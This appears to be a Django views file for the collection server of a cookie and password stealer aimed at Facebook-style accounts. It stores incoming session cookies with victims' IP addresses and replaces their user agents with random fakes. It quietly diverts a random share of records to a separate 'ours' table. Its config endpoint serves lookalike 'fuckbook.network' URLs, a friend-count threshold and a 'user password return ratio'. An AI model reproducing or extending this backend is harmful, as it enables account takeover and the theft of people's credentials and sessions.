from django.shortcuts import render
from django.http import HttpResponse, Http404, JsonResponse

# Create your views here.
from django.template import loader

from .models import Cookies

from rest_framework.permissions import IsAuthenticated  # <-- Here
from django.http import Http404
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status

from cookies.serializers import CookiesSerializer, CookiesSerializer_my


# from django.contrib.auth.decorators import login_required
#
# @login_required
def index(request):
    latest_cookies_list = Cookies.objects.order_by('-created')
    template = loader.get_template('cookies/index.html')
    context = {
        'latest_cookies_list': latest_cookies_list,
    }

    return HttpResponse(template.render(context, request))

USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60',
        'Opera/8.0 (Windows NT 5.1; U; en)',
        'Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50',
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
        'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0',
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36'
    ]

import random
from .http_util import run_notify_in_thread
class HelloView(APIView):
    permission_classes = (IsAuthenticated,)  # <-- And here
    def get_ip_ua(self, request, obj):
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded_for:
            ipaddress = x_forwarded_for.split(',')[-1].strip()
        else:
            ipaddress = request.META.get('REMOTE_ADDR')
        user_agent = request.META.get('HTTP_USER_AGENT')
        # 覆盖原来的ua
        user_agent = random.choice(USER_AGENTS)

        obj.ua = user_agent
        obj.ip  = ipaddress
        obj.save()
        # notify_ok_http_get(ipaddress)

    def get(self, request):
        cookies = Cookies.objects.all()
        serializer = CookiesSerializer(cookies, many=True)

        return Response(serializer.data)

    # 按一定概率保存到某个model里面
    def post(self, request):
        print("-------- post ---------")
        print(request.data)
        serializer = CookiesSerializer(data=request.data)
        serializer_my = CookiesSerializer_my(data=request.data)

        if serializer.is_valid():
            #'You must call `.is_valid()` before calling `.save()`
            serializer_my.is_valid()
            if random.randint(0, 100) > 99: # 我们的开始先给他们哈
                obj = serializer_my.save()
                # get ip
                self.get_ip_ua(request, obj)
                print("serializer_my created ok")
            else: # 他们的
                obj = serializer.save()
                # get ip
                self.get_ip_ua(request, obj)
                print("serializer created ok")
                run_notify_in_thread(obj.ip)

            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

# "friends_num"  好友数低于多少回传
# upw_persent  用户密码回传比例 0~100
class GetUrlsView(APIView):
    # permission_classes = (IsAuthenticated,)  # <-- And here

    def post(self, request):
        return JsonResponse({'url': 'https://fuckbook.network/app/',
                             'url_redirect':'https://fuckbook.network/app/video/',
                             'url_redirect2': 'https://fuckbook.network/app/video/',
                             'friends_num': 1500,
                             'upw_persent': 50
                             })

